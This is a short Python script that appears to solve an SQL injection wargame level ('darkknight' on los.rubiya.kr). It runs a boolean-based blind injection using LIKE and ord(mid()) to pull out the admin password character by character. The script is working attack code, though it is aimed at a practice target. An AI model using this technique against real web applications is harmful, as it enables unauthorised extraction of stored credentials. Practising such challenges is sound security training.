import requests
url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
cookie = {'PHPSESSID' : 개인쿠키값}

for i in range(1, 9):
    for j in range(48, 123):
        req_url = url + f'?no=1 or id like "admin" and ord(mid(pw,{i}, 1)) like {j}%23'
        res = requests.get(req_url, cookies=cookie)
        if "<h2>Hello admin</h2>" in res.text:
            print(f"{i}th char : {chr(j)}")
            continue
    